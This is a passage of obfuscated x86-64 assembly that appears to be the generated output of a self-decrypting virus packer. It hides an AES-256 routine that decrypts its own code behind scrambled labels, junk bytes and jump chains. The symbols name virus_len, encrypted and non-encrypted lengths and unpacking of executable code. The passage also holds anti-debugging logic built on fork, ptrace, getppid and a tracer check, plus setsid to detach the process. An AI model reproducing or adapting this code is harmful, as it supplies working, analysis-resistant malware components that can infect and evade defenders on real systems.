..@E8do7gZxUwJu:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    push        rsi
%endif
%endif
    mjmp        ..@EViB45SPrtMX
..@im4OYrTgegkT:
    movv        rax, SYS_MPROTECT
    mjmp        ..@Z3nnCn0SV9Sf
..@La84HlHoYDqE:
    movdqa      OWORD [rsi+0x70], xmm3
    aeskeygenassist xmm2, xmm3, 0x8
    call        ..@L3bxxw1uVCTD
    mjmp        ..@CFp2Ta0iK9qk
db 0x9d
..@CFp2Ta0iK9qk:
    mjmp        ..@0qeOfemOzBjZ
..@dAVrUwPPwKZN:
    jl          ..@AV1jbDDm0YN0
    xchg        rax, rax
    movdqu      OWORD [r1], xmm0
    movdqu      OWORD [r1+0x10], xmm1
    mjmp        ..@i1u9R1yPmdjT
db 0x11, 0xf1
..@i1u9R1yPmdjT:
    mjmp        ..@xrx1HGec5C65
..@7ox6SZLNsse3:
    movr        rdi, rdi
    pop         rcx
    mjmp        ..@oa95ySK2QoeZ
..@AV1jbDDm0YN0:
    movdqu      xmm2, OWORD [r2+rax]
    mjmp        ..@KGimnQMvwNcX
..@spyJUbnH5sSq:
    GGLOBAL     _packed
    mov         m8, r5 
    call        Processes
    xor         r1, r1
    mjmp        ..@9dGGwqJgWZCb
db 0x6d
..@9dGGwqJgWZCb:
    mjmp        ..@8D2NoN9tQ70r
..@US3PcS0m8oxv:
    push        rbp
    movr        rbp, rsp
    mjmp        ..@eZ0T3F69v6ZT
..@AMrLSpVMWdWI:
    movdqu      OWORD [rsp+0x80],xmm0
    movdqu      xmm1, OWORD [rsp+0x90]
    aesimc      xmm0,xmm1
    push        rdx
    mjmp        ..@zM49zDqifgib
db 0x41
..@zM49zDqifgib:
    mjmp        ..@BgJ1o92WX1CW
..@BgJ1o92WX1CW:
    mjmp        ..@pzFMPKMAsCNx
..@jfb0r9gmMs35:
    mjmp        ..@FVUX9DeE1aIR
    mjmp        ..@ShqZTqD8im0q
db 0x23, 0xd2
..@ShqZTqD8im0q:
    mjmp        ..@Z8fkG9aoSgOY
..@HHJ1yCz8doN9:
    aesdec      xmm0, xmm1
    movdqu      xmm1, OWORD [rsp+0x60]
    mjmp        ..@A4TTBbQ5fjsJ
db 0xd7, 0x3c, 0x19
..@A4TTBbQ5fjsJ:
    mjmp        ..@ORT0AXzuOoqG
..@4llA5YSiZTPZ:
    pop         rax
    mjmp        ..@cycLdzmWL0JF
db 0x2e
..@cycLdzmWL0JF:
    mjmp        ..@audwXU94Nfan
..@jMRMaFfNmYLi:
    call        ..@9fwDTm3AWhb4
    mjmp        ..@La84HlHoYDqE
..@0qeOfemOzBjZ:
    movdqa      OWORD [rsi+0x80], xmm1
    push        rsi
    pop         rsi
    aeskeygenassist xmm2, xmm1, 0x0
    call        ..@9fwDTm3AWhb4
    mjmp        ..@t4Sw00reVI7h
db 0xe5, 0xab, 0xfb
..@t4Sw00reVI7h:
    mjmp        ..@QOvAwEqFpzJ4
..@vFCHjh6cCAUq:
    test        rax, rax
    jz          ..@YCDu5EzcKcKb
    xchg        rdx, rdx
    mjmp        ..@YJ7b5S7UNJxM
..@EKCw4OszfsVI:
    pop         rdi
    sub         rdi, 1
    sub         rdi, 0x5
    mjmp        ..@Rc969kd8DuvX
db 0x4b
..@Rc969kd8DuvX:
    mjmp        ..@CW1plLOaJE2N
..@a3zZTP07u3iJ:
    movr        rbp, rbp
    test        r5, r5
    jz          ..@AnE4rvLME8zE
    mjmp        ..@gGuGcvNNp1uH
db 0xf8, 0x3c
..@gGuGcvNNp1uH:
    mjmp        ..@jQazAZ24gfKI
..@jQazAZ24gfKI:
    mjmp        ..@XLnd2AlxlVSA
..@sZydT2jZlUHJ:
%ifndef ENABLE_DEBUGGING
    movv        r4, tracerline_size
%endif
    mjmp        ..@JAZ04g8w3aWX
db 0x22, 0x04, 0x3b
..@JAZ04g8w3aWX:
    mjmp        ..@BKu3ArEovCrl
..@l29IA5qPWXP4:
    movr        rdx, rdx
    mjmp        ..@4tsdug9uTZOS
ExitProgram:
    mjmp        ..@TgvYBg8X7bOf
..@audwXU94Nfan:
    test        eax, eax
    mjmp        ..@2arZkhXoRGyW
..@h9MkTA1CrUde:
%ifndef ENABLE_DEBUGGING
    call        ExitProgram
%endif
    mjmp        ..@5pMIiL0bbgTg
db 0xed
..@5pMIiL0bbgTg:
    mjmp        ..@FdpnmK9KV6Ou
db 0x98, 0x91, 0x19
..@FdpnmK9KV6Ou:
    mjmp        ..@9i1kOSPDcu1r
db 0xef, 0x06, 0x25
..@9i1kOSPDcu1r:
    mjmp        ..@2Fc9X6FwyjMf
db 0x14
..@2Fc9X6FwyjMf:
    mjmp        ..@jJW7oxqz3j9d
..@C6maDY6EfSqT:
    mjmp        UnpackExecutableCode
    mjmp        ..@BVUmNAyjcuke
db 0xf4, 0x19, 0xa1
..@BVUmNAyjcuke:
..@1ZZsA9ra93oH:
    xor         rbx, rbx
    mjmp        ..@311fQINPpwFy
..@iasGngSlU679:
    call        ..@L3bxxw1uVCTD
    movdqa      OWORD [rsi+0xa0], xmm1
    mjmp        ..@ynbgzNrTWxcZ
db 0xc8
..@ynbgzNrTWxcZ:
    mjmp        ..@jtWi4FHSbAdV
..@E05PENmGcQHk:
    mov         rdx, QWORD [rsp]
    sub         rdx, rcx
    xchg        rsp, rsp
    sub         QWORD [rsp+2*bytes], rdx
    mjmp        ..@lILjAqREo9WW
    mjmp        ..@akrLnnk1yTQI
..@akrLnnk1yTQI:
    mjmp        ..@1ZZsA9ra93oH
..@2Ecnuh0LGWIR:
    movdqu      OWORD [rsp+0xb0],xmm0
    mjmp        ..@Hv4Ba7AnSwEd
db 0xe2, 0x32, 0xb4
..@Hv4Ba7AnSwEd:
    mjmp        ..@ZYPY2jxnPURI
..@M1bF0cf4q1ju:
    aeskeygenassist xmm2, xmm1, 0x0
    mjmp        ..@7QwlRedZf2DA
db 0x32, 0xab, 0xcb
..@7QwlRedZf2DA:
    mjmp        ..@tegM694CfXR4
..@bb4yMprv3Q5v:
    lea         rdi, [rsp+_UEC_OFF.key]
    mjmp        ..@E858d4bqjUmx
db 0xfa, 0x36, 0xea
..@E858d4bqjUmx:
    mjmp        ..@ijK4AWZMhX11
..@eJcv8YMGXlZV:
    xor         r3, r3
    mjmp        ..@ipEMbXQjCZhI
db 0x3b
..@ipEMbXQjCZhI:
    mjmp        ..@VX4LPF6ewuS5
..@jDopOOxo4EAo:
    rep         nop
    mjmp        ..@4x9bcC25xloU
..@e93gdPvoR3kz:
    call        ExitProgram
    mjmp        ..@4Uokn7brk35J
..@LpYV1COcDC9Z:
    cmp         rax, QWORD [rsp]
    mjmp        ..@WrDTgIHVIRqM
..@WrDTgIHVIRqM:
    mjmp        ..@dAVrUwPPwKZN
..@eySvRBfjDf5Y:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    xchg        rbx, rbx
%endif
%endif
    mjmp        ..@5FpxKeCqQIbd
db 0x43, 0xe3
..@5FpxKeCqQIbd:
    mjmp        ..@Hv6Hdg957B4R
..@aywzQNFmKnQw:
    aesimc      xmm0,xmm1
    mjmp        ..@hvZq20qrPAwM
..@nXt0xnHSkicD:
    push        rdi
    pop         rdi
    aeskeygenassist xmm2, xmm3, 0x4
    call        ..@L3bxxw1uVCTD
    mjmp        ..@Zpy1in0QQr0Q
..@konqB8VHBrbw:
    and         r3, 0ffffffffffffffe0h
    mjmp        ..@C6J2HsvzaQYF
db 0xae, 0x0b
..@C6J2HsvzaQYF:
    mjmp        ..@LyMlu4ZuRHBh
..@YCDu5EzcKcKb:
    xchg        rcx, rcx
    mjmp        ..@gxaGO4iwHtoK
..@ZYPY2jxnPURI:
    movdqu      xmm1, OWORD [rsp+0xc0]
    aesimc      xmm0,xmm1
    movr        rdx, rdx
    mjmp        ..@vsCwM9DMmtPQ
db 0x49, 0x03, 0x02
..@vsCwM9DMmtPQ:
    mjmp        ..@OyXfcwXfA7S2
..@rEBAfHeT9Q7Z:
    cmp         BYTE [r1 + rax], 0x0
    mjmp        ..@C0zth4jFrytu
db 0x4a, 0xfd
..@C0zth4jFrytu:
    mjmp        ..@X2tSmJKeXTmB
..@usYRoOxM22LZ:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    pop         rbx
%endif
%endif
    mjmp        ..@oWhDOVhBkifV
db 0x9c
..@oWhDOVhBkifV:
    mjmp        ..@0U7YDtkeWfwr
..@xxI1iyx2cJpm:
    add         rsp, bytes
    VAR         public, _start
    movr        r1, r5
    movr        rsp, rsp
    mjmp        ..@WDlDYI0oWriR
db 0x02, 0xd2
..@WDlDYI0oWriR:
    mjmp        ..@wQ4CFR1X53Hh
db 0xd5
..@wQ4CFR1X53Hh:
    mjmp        ..@WIUFV3VVr1MX
db 0x3b
..@WIUFV3VVr1MX:
    mjmp        ..@2dxETUatA6Xq
..@oOowFp5pl1mB:
    movdqu      xmm0, [rsi+rcx]
    movdqu      xmm1, OWORD [rsp+0xe0]
    push        rsi
    mjmp        ..@87AXH4r3Sexf
..@SDAsr5YJ60W7:
    movdqu      xmm1, OWORD [rsp+0xc0]
    aesdec      xmm0, xmm1
    movr        rbx, rbx
    movdqu      xmm1, OWORD [rsp+0xb0]
    aesdec      xmm0, xmm1
    mjmp        ..@FuTUDUYr55np
..@EjbKVZDA8Db9:
    mov         QWORD [rsp+_AESD_OFF.startaddr], r1
    mov         QWORD [rsp+_AESD_OFF.length], r2
    mov         QWORD [rsp+_AESD_OFF.keyaddr], r3
    movr        rsi, rsp
    mjmp        ..@JbfgcBor6Tzz
db 0x2e, 0x92, 0x64
..@JbfgcBor6Tzz:
    mjmp        ..@SgHLmqpLZf5Q
..@KGimnQMvwNcX:
    movdqu      xmm3, OWORD [r2+rax+0x10]
    mjmp        ..@anHYMdZPFQi8
..@hdXgFe5mAtIy:
    movdqu      xmm3, [rdi+0x10]
    mjmp        ..@G6iTsSuvty1S
..@5307TW3r97eK:
    movr        rbp, rbp
    mjmp        ..@spyJUbnH5sSq
..@TgvYBg8X7bOf:
    DESTROY_MX_VAR
    mjmp        ..@XoT7w5b01pxn
..@b3ikBM41C0Kg:
    sub         rsp, _UEC_OFF_size
    mjmp        ..@qXFFeG6DHpxQ
..@CW1plLOaJE2N:
    INIT_MX_VAR
    mov         vsp, rdi
    movr        rdi, rbp
    movr        rbx, rbx
    movr        rbx, rbx
    mjmp        ..@QeQZ2DAEVMBa
..@2Q48b8DyauWF:
    movdqu      xmm1, [rdi]
    mjmp        ..@zeUi5x92HmQH
db 0x30, 0xe5
..@zeUi5x92HmQH:
    mjmp        ..@hdXgFe5mAtIy
..@ae50Z09YajnB:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    xor         r4, r4
%endif
%endif
    mjmp        ..@m873KKNJhmG8
db 0xe8
..@m873KKNJhmG8:
    mjmp        ..@AGkdvsSr3w4x
db 0x4f, 0xd8, 0x0d
..@AGkdvsSr3w4x:
    mjmp        ..@Yeiqy59eqQk4
db 0x0b
..@Yeiqy59eqQk4:
    mjmp        ..@hzRcrtRuoUpE
db 0x2e, 0x29
..@hzRcrtRuoUpE:
    mjmp        ..@RfxILknWDdPq
..@Z8fkG9aoSgOY:
    xor         r2, r2
    mjmp        ..@YCDu5EzcKcKb
..@fW5bPVfW6gM7:
    GGLOBAL     virus_len
    mov         r2d, DWORD [r5]
    add         r2, r4
    sub         r2, non_encrypted_len
    movr        r5, r2
    mjmp        ..@xbmVRLBoD6fp
..@4x9bcC25xloU:
    xor         rcx, rcx
    mjmp        ..@BLAKWB1DMn1j
..@BtTkhg0YzuhH:
    pop         r2
    mjmp        ..@5WdnGHkKLrQh
..@OES1EIFl706p:
    je          ..@4Uokn7brk35J
    mjmp        ..@5GBqrr1L2aqV
..@Egoo9FA0mQFP:
    xor         r2, r2
    mjmp        ..@I7PdSSfg5pXv
db 0xab, 0xb1
..@I7PdSSfg5pXv:
    mjmp        ..@eJcv8YMGXlZV
..@B4wKcOcowR75:
    xor          r4, r4
    mjmp        ..@g3WpebzG5njr
..@g3WpebzG5njr:
    mjmp        ..@d3keTVavsVN2
..@SaZt7vMVxU6M:
    xchg        rsi, rsi
    mjmp        ..@NEUHYsMw6qqq
..@zIBZZyLbZIq0:
    DESTROY_MX_VAR
    movr        rax, r1
    mjmp        ..@00mTrnqMDVMC
db 0x13, 0xe7
..@00mTrnqMDVMC:
    mjmp        ..@mOtxURlmUtYq
Aes256KeyCreation:
    mjmp        ..@konqB8VHBrbw
..@SgHLmqpLZf5Q:
    mov         rdi, QWORD [rsp+_AESD_OFF.keyaddr]
    mjmp        ..@W0ld7TqzKl80
..@W0ld7TqzKl80:
    mjmp        ..@UnjjWSZiBA0g
..@QOvAwEqFpzJ4:
    movdqa      OWORD [rsi+0x90], xmm3
    aeskeygenassist xmm2, xmm3, 0x10
    mjmp        ..@hfppWXiEoDT9
db 0x43, 0xa1
..@hfppWXiEoDT9:
    mjmp        ..@bzAbqm49rmfo
db 0x99, 0x6d
..@bzAbqm49rmfo:
    mjmp        ..@iasGngSlU679
..@ijK4AWZMhX11:
    movv        rcx, 0x8
    rep         movsd
    lea         r1, [rsp+_UEC_OFF.key]
    mjmp        ..@twgHu0c1UZYT
db 0x07, 0x20
..@twgHu0c1UZYT:
    mjmp        ..@H6P5ntrlqz9q
db 0x65, 0xaf
..@H6P5ntrlqz9q:
    mjmp        ..@uO4tNzZxacvu
..@BLAKWB1DMn1j:
    mov         rsi, QWORD [rsp+_AESD_OFF.startaddr]
    mjmp        ..@KJ0JJuIFHllH
db 0x64, 0xa4
..@KJ0JJuIFHllH:
    mjmp        ..@ByXDAf0Cc9nD
..@5GBqrr1L2aqV:
    xor         rax, rax
    mjmp        ..@QzRXTwlhMRsM
db 0x42, 0xc1
..@QzRXTwlhMRsM:
    mjmp        ..@c13hz7W4OftD
..@5nKdquY9qvGi:
    pop         rsi
    mjmp        ..@d6oU4V4sXOSH
..@d6oU4V4sXOSH:
    mjmp        ..@WLcCwl0tOhe9
..@anGEvexMa7XY:
%ifndef ENABLE_DEBUGGING
    VAR         public, lines
%endif
    mjmp        ..@Fb04VGGdkqxC
db 0x4a
..@Fb04VGGdkqxC:
    mjmp        ..@pJyKSuoKqUvo
Aes256Decryption:
    mjmp        ..@US3PcS0m8oxv
..@x78o0TJv9nNz:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    xor         r4, r4
%endif
%endif
    mjmp        ..@h7XlEsHWm5OZ
db 0x49
..@h7XlEsHWm5OZ:
    mjmp        ..@1imic2dA3G4U
db 0x66
..@1imic2dA3G4U:
    mjmp        ..@Vv0M4qLtDDDW
..@4EO8CuGQmhux:
    movr        rdx, rdx
    mjmp        ..@BRpHWc4Mck41
..@lYpF6FzAmGLf:
    movdqu      xmm1, OWORD [rsp+0x80]
    aesimc      xmm0,xmm1
    mjmp        ..@kV5Eap2hs7r1
db 0xe4
..@kV5Eap2hs7r1:
    mjmp        ..@AMrLSpVMWdWI
..@f4s54hjlIaCo:
    xor         rax, rax
    movv        rax, SYS_SETSID
    mjmp        ..@sfnbpSqWY8tP
db 0xef
..@sfnbpSqWY8tP:
    mjmp        ..@qceZFigsmYvq
..@FVUX9DeE1aIR:
    mov         r1, QWORD [rsp]
    mjmp        ..@dgy3Ucci84FF
..@EViB45SPrtMX:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    pop         rsi
    xor         r4, r4
    movv        rax, SYS_WAIT4
    syscall
%endif
%endif
    mjmp        ..@KcvfL72yRCny
..@KcvfL72yRCny:
    mjmp        ..@837GlaX47NXI
db 0xe0, 0xc4, 0x13
..@837GlaX47NXI:
    mjmp        ..@uiTUqka3tBry
..@YdfQ63RTgkQ0:
%ifndef ENABLE_DEBUGGING
    jl          ..@NIeW31UXwSt0
%endif
    mjmp        ..@cbY3Q7F7LVLP
db 0xd4, 0xfc
..@cbY3Q7F7LVLP:
    mjmp        ..@U0FKh8dA6x9t
..@U0FKh8dA6x9t:
    mjmp        ..@UQTHNFfgaqvN
..@RfxILknWDdPq:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    movv        rax, SYS_PTRACE
    xchg        rsp, rsp
    syscall
    push        rbx
%endif
%endif
    mjmp        ..@CbcIjG67y8Tb
db 0xd3
..@CbcIjG67y8Tb:
    mjmp        ..@usYRoOxM22LZ
..@DXjNjzGB496Q:
    push        rcx
    pop         rcx
    mjmp        ..@kQIbKoSdhCjW
db 0x20
..@kQIbKoSdhCjW:
    mjmp        ..@KzvAobRPLrUn
..@BfoDnsb7pUHd:
    ret
    mjmp        Aes256Decryption
..@NuwteUO91QSR:
    and         r1, ~(PAGE_SIZE-1)
    movr        r4, r5
    sub         r4, r1
    push        rdi
    pop         rdi
    mjmp        ..@UBusu6PcO16l
..@UBusu6PcO16l:
    mjmp        ..@SgnbM5ZYGm13
db 0x4f
..@SgnbM5ZYGm13:
    mjmp        ..@fW5bPVfW6gM7
..@pzFMPKMAsCNx:
    pop         rdx
    movdqu      OWORD [rsp+0x90],xmm0
    mjmp        ..@PM7BcQplng6D
..@NUhahp9Izc9R:
    ret
    mjmp        Aes256KeyExpansion
..@COq2tlrCavkF:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    xor         rax, rax
%endif
%endif
    mjmp        ..@H42MNcsZ0iar
..@UNwUCuFJehS3:
    xor          r1, r1
    xor          r2, r2
    push        rdi
    pop         rdi
    xor          r3, r3
    mjmp        ..@w0WlkHLsyuSa
db 0xf6
..@w0WlkHLsyuSa:
    mjmp        ..@B4wKcOcowR75
..@H42MNcsZ0iar:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    movv        rax, SYS_FORK
    syscall
    cmp         eax, 0x0
    jl          ..@NIeW31UXwSt0
    test        eax, eax
%endif
%endif
    mjmp        ..@ht78U8r5nlNE
db 0xfb, 0x65
..@ht78U8r5nlNE:
    mjmp        ..@lnl3Cs7rHWm6
db 0x6c
..@lnl3Cs7rHWm6:
    mjmp        ..@RR41MmFXrinX
..@XxTAUtClUvry:
    movdqa      OWORD [rsi+0x40], xmm1
    aeskeygenassist xmm2, xmm1, 0x0
    call        ..@9fwDTm3AWhb4
    mjmp        ..@uien7pcbswRh
db 0x20, 0xf6, 0xc7
..@uien7pcbswRh:
    mjmp        ..@kdrZ2uO1dEqK
..@KdMoCioDEqZM:
    push        rsi
    mjmp        ..@SgVefEZKTJNz
..@jOcsohRx67SE:
    pop         rdi
    mjmp        ..@MqjsNrEss7Ke
..@MqjsNrEss7Ke:
    jz          ..@QfGv614pPefE
    add         rax, 1
    mjmp        ..@rEBAfHeT9Q7Z
    mjmp        ..@QfGv614pPefE
..@8D2NoN9tQ70r:
    call        ExitProgram
    mjmp        ..@yr3DKILL53Gc
db 0xff, 0xb3, 0xe5
..@yr3DKILL53Gc:
    mjmp        ..@b3ikBM41C0Kg
..@D27xa3mogJLr:
    xor         rdi, rdi
    mjmp        ..@5dTEbWhXEEJE
GetEnv:
    mjmp        ..@50Uc8RtxKdj7
..@oRL5xeUUAt1A:
    movdqu      xmm1, OWORD [rsp+0xd0]
    mjmp        ..@OUOOpG1uPK09
db 0x0c
..@OUOOpG1uPK09:
    mjmp        ..@M69Z3l9PXzDY
..@M69Z3l9PXzDY:
    mjmp        ..@aywzQNFmKnQw
..@Lq6ahHMG5dSy:
%ifndef ENABLE_DEBUGGING
    movr        rbx, rbx
%endif
    mjmp        ..@FNJpToMI5IcX
..@ptmgSmI8KnZx:
    xor         rax, rax
    mjmp        ..@duI6Shh4sapH
db 0xf3
..@duI6Shh4sapH:
    mjmp        ..@BZZfoshTnaCb
db 0xf2
..@BZZfoshTnaCb:
    mjmp        ..@LH6er2uXxmSs
..@311fQINPpwFy:
    movr        rax, rbx
    add         rsp, 4*bytes
    mjmp        ..@u3Jd8kEAC9rz
..@u3Jd8kEAC9rz:
    mjmp        ..@mNYDmoBtUSvM
..@mNYDmoBtUSvM:
    mjmp        ..@kEJIvY3wZ3cx
..@xdhlnGEVVXlO:
    push        r1
    push        r2
    push        r3
    xor         rax, rax
    push        rsi
    mjmp        ..@5nKdquY9qvGi
..@rpflIYjald48:
%ifndef ENABLE_DEBUGGING
    movr        rbx, rbx
%endif
    mjmp        ..@f4s54hjlIaCo
..@d3keTVavsVN2:
    push        rax
    pop         rax
    mjmp        ..@XqGsiCk8mTra
db 0x3a
..@XqGsiCk8mTra:
    mjmp        ..@NdJzKk0ToxnO
..@5WdnGHkKLrQh:
    movr        rdx, rdx
    mjmp        ..@xISD3hhEZAxG
..@hvZq20qrPAwM:
    movdqu      OWORD [rsp+0xd0],xmm0
    mjmp        ..@LwiiGjrFZdnU
db 0x91, 0xce
..@LwiiGjrFZdnU:
    mjmp        ..@oOowFp5pl1mB
..@jJW7oxqz3j9d:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    movv        rax, SYS_GETPPID
%endif
%endif
    mjmp        ..@TmL5gNv9cORc
db 0x0c, 0x3a
..@TmL5gNv9cORc:
    mjmp        ..@C9r1dSgNkASY
..@obx0fcpFgmp7:
    add         r2, 1
    mjmp        ..@AnE4rvLME8zE
..@ivrww7mJJR6V:
    pop         rbx
    mjmp        ..@XWbUHI4hxtjn
db 0xce, 0x26, 0xc5
..@XWbUHI4hxtjn:
    mjmp        ..@ptmgSmI8KnZx
..@w4WMjBY2GhST:
    push        r1
    push        r2
    mjmp        ..@I30hOPUZ36bn
..@UQTHNFfgaqvN:
%ifndef ENABLE_DEBUGGING
    movr        r5, rax
    push        rcx
    xchg        rdx, rdx
    pop         rcx
    RFILE       rax, [rsp], 0x200
%endif
    mjmp        ..@5EmMGo8oRmDV
..@GfZWDmKcBx5S:
    syscall
    mjmp        ..@v5zg2a8wK4zc
db 0x1b, 0x11, 0x0b
..@v5zg2a8wK4zc:
    mjmp        ..@ZvPaBGXQuE57
db 0x0a, 0xaf
..@ZvPaBGXQuE57:
    mjmp        ..@yiZm0Sso4UOH
..@tdvXsOT3vCRd:
    pxor        xmm3, xmm2
    mjmp        ..@E6WmGRWu0vp7
db 0x29, 0xad
..@E6WmGRWu0vp7:
    mjmp        ..@BfoDnsb7pUHd
..@VhVz46qbQKBc:
    ret
    movr        rsp, rsp
    mjmp        DecryptExecutableCode
..@jtWi4FHSbAdV:
    aeskeygenassist xmm2, xmm1, 0x0
    mjmp        ..@PRkEQ2G8c8MO
..@QeQZ2DAEVMBa:
    add         rdi, bytes
    mjmp        ..@3JsKXshvX8UX
Aes256KeyExpansion:
    mjmp        ..@2Q48b8DyauWF
..@ok37DpnydYmm:
    movdqu      xmm0, OWORD [r1]
    movdqu      xmm1, OWORD [r1+0x10]
    xor         rax, rax
    mjmp        ..@UoK7FF9gVzly
db 0xcb, 0xf3
..@UoK7FF9gVzly:
    mjmp        ..@bnIqR67sJY8K
..@bnIqR67sJY8K:
    mjmp        ..@ykH6zUDd0CMy
db 0x6b, 0x3b
..@ykH6zUDd0CMy:
    mjmp        ..@gI2p7dlTb8ET
..@5ZHBtw3BB50B:
    movdqu      OWORD [rsp+0x50],xmm0
    movdqu      xmm1, OWORD [rsp+0x60]
    aesimc      xmm0,xmm1
    movdqu      OWORD [rsp+0x60],xmm0
    xchg        rax, rax
    mjmp        ..@DAcT4klYHM3J
..@DAcT4klYHM3J:
    mjmp        ..@XQrOzMNsNqEP
db 0x3b
..@XQrOzMNsNqEP:
    mjmp        ..@UkkZUT5mq635
db 0x94, 0x16, 0x4f
..@UkkZUT5mq635:
    mjmp        ..@wj8BoETxYS42
..@ON25FhoCmuzl:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    syscall
%endif
%endif
    mjmp        ..@yztc9wsBOsAP
db 0x29, 0x96
..@yztc9wsBOsAP:
    mjmp        ..@NIeW31UXwSt0
..@Q4AbOtA8wKQ4:
    pslldq      xmm4, 0x4
    mjmp        ..@eyaRuHXpklbW
db 0xac, 0x35, 0x65
..@eyaRuHXpklbW:
    mjmp        ..@PEUultwqkoRe
..@ESBkbuWtACgv:
    pxor        xmm1, xmm3
    mjmp        ..@xGNpyWzo7or0
db 0x38, 0xac, 0xcc
..@xGNpyWzo7or0:
    mjmp        ..@PC9HCQRSS9ry
db 0x0e, 0xaf
..@PC9HCQRSS9ry:
    mjmp        ..@d0qXOQ2wEKTY
..@R5vvOCvVqriJ:
    movdqa      xmm4, xmm3
    pslldq      xmm4, 0x4
    pxor        xmm3, xmm4
    pslldq      xmm4, 0x4
    pxor        xmm3, xmm4
    mjmp        ..@GY7sJoqvXrLt
db 0x1b, 0x35, 0xd3
..@GY7sJoqvXrLt:
    mjmp        ..@bmS7R1BAgFVw
..@T0SF1FOOHK24:
    movr        rcx, rcx
    mjmp        ..@M3m0qE0ym7dM
db 0xae, 0x97
..@M3m0qE0ym7dM:
    mjmp        ..@NBUKdAFAo1zL
db 0xf8
..@NBUKdAFAo1zL:
    mjmp        ..@gbWvknFquNO9
..@LH6er2uXxmSs:
    push        rax
    pop         rax
    mjmp        ..@rEBAfHeT9Q7Z
..@yIvdO6GDGlR7:
    add         r1, 1
    mjmp        ..@Mx1URQXYTfTy
..@Mx1URQXYTfTy:
    mjmp        ..@oSO0AqgL6zua
db 0xd6
..@oSO0AqgL6zua:
    mjmp        ..@p6CDi27gL0Jh
..@XEBVgFp2TJJ2:
    ret
    mjmp        ..@cSyL3UltRdnj
..@cSyL3UltRdnj:
    mjmp        ..@Ovozcpm0VYza
db 0xe8, 0x1e
..@Ovozcpm0VYza:
    mjmp        ..@9fwDTm3AWhb4
..@5IufCwM8ysUh:
    push        r3
    push        r4
    mjmp        ..@30kKhAlxDlfc
..@xISD3hhEZAxG:
    pop         r1
    mjmp        ..@qvmonU5q0gbF
..@B6sCcvhXivwN:
%ifndef ENABLE_DEBUGGING
    rep         nop
    movv        r1, 1
%endif
    mjmp        ..@h9MkTA1CrUde
..@PEUultwqkoRe:
    pxor        xmm1, xmm4
    mjmp        ..@SaZt7vMVxU6M
..@WbX1TGpLZYkS:
    pop         rdx
    and         r2, 0xfffffffffffffff0
    lea         r3, [rsp+_UEC_OFF.key]
    call        Aes256Decryption
    mjmp        ..@SgLvDCMJE1cv
db 0x64, 0x2a, 0x34
..@SgLvDCMJE1cv:
    mjmp        ..@C6maDY6EfSqT
..@xbmVRLBoD6fp:
    and         r5, PAGE_SIZE-1
    push        rdx
    pop         rdx
    mjmp        ..@a3zZTP07u3iJ
..@R1DE8jiPy9uw:
    rep         cmpsb
    movr        rbx, rbx
    movr        rdx, rdx
    jz          ..@311fQINPpwFy
    movr        rax, rax
    mjmp        ..@E05PENmGcQHk
..@pewTMMTplu68:
%ifndef ENABLE_DEBUGGING
    CFILE       r5d
%endif
    mjmp        ..@7jniXg3dupzB
..@6EOh6swoVSSi:
    movdqa      OWORD [rsi+0x10], xmm3
    mjmp        ..@6YVFPlDgrv7i
..@ktpysX1ujP3v:
    movdqu      xmm1, OWORD [rsp+0x70]
    mjmp        ..@HHJ1yCz8doN9
..@syidyrvIGtDm:
%ifndef ENABLE_DEBUGGING
    jnz         ..@46qePee93Y4V
%endif
    mjmp        ..@bRkk39jFkd3o
..@bRkk39jFkd3o:
    mjmp        ..@sdDuquFEAWaK
db 0xe6
..@sdDuquFEAWaK:
    mjmp        ..@u5tc60LLiyMX
db 0x33, 0x12
..@u5tc60LLiyMX:
    mjmp        ..@anGEvexMa7XY
..@BTqvdITkZyrV:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    push        rax
    pop         rax
%endif
%endif
    mjmp        ..@Mj2HscdJEEJz
db 0x25
..@Mj2HscdJEEJz:
    mjmp        ..@AxGurTh8pvBW
db 0x43, 0xe5, 0x63
..@AxGurTh8pvBW:
    mjmp        ..@ae50Z09YajnB
..@LZBjPEZQEdn3:
    movdqu      xmm1, OWORD [rsp+0x30]
    rep         nop
    push        rcx
    mjmp        ..@hs0gS9ohJ9VZ
..@qvmonU5q0gbF:
    ret
    mjmp        GetEnv
..@3ciUpBtFdOFp:
    push        rbx
    pop         rbx
    aesdeclast  xmm0, xmm1
    mjmp        ..@zR5ckFHWKSCR
db 0x3d, 0x04, 0xe2
..@zR5ckFHWKSCR:
    mjmp        ..@vp6goYNPzvh5
..@vp6goYNPzvh5:
    mjmp        ..@fZgu4zKEQ4R6
db 0x34, 0xe3, 0x15
..@fZgu4zKEQ4R6:
    mjmp        ..@dOG0lGwRJIpN
..@dOG0lGwRJIpN:
    mjmp        ..@GPPZ1z17WNcq
..@gI2p7dlTb8ET:
    movr        rbp, rbp
    mjmp        ..@d0qXOQ2wEKTY
    mjmp        ..@luSAyY0I68cK
db 0x3c
..@luSAyY0I68cK:
    mjmp        ..@YfE3qq13Cz69
db 0x9d, 0x4d
..@YfE3qq13Cz69:
    mjmp        ..@AnNb2WGrGJyU
..@LB4cIZCX6Jft:
    aesimc      xmm0,xmm1
    movdqu      OWORD [rsp+0x40],xmm0
    mjmp        ..@IG2o0rjyH48I
..@BRpHWc4Mck41:
    movdqu      xmm1, OWORD [rsp+0x80]
    push        rax
    pop         rax
    aesdec      xmm0, xmm1
    mjmp        ..@ktpysX1ujP3v
..@PM7BcQplng6D:
    movdqu      xmm1, OWORD [rsp+0xa0]
    mjmp        ..@nDq4ewQIZZxs
..@nDq4ewQIZZxs:
    mjmp        ..@FXfR11bsSuh5
..@FXfR11bsSuh5:
    mjmp        ..@TZXxA3G01VMO
..@ByXDAf0Cc9nD:
    movdqu      xmm1, OWORD [rsp+0x10]
    aesimc      xmm0,xmm1
    mjmp        ..@MIwSGMspSwyi
db 0x2e, 0xb5
..@MIwSGMspSwyi:
